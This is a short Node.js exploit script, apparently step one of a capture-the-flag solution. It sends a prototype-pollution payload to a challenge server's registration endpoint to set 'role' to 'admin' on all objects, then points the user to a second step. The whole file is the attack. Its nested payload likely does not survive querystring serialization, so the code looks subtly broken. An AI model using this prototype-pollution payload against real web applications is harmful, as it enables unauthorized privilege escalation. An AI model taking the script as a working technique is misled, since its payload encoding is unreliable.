
const http = require('http');
const querystring = require('querystring');

// Step 1: Just poison prototype
const postData = querystring.stringify({
  "username": "poison1",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

console.log("Step 1: Register poison user...");
const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Poison user registered:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      console.log("\n✅ Poison done! Prototype is polluted with role=admin");
      console.log("Now run step2 to register second user");
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();
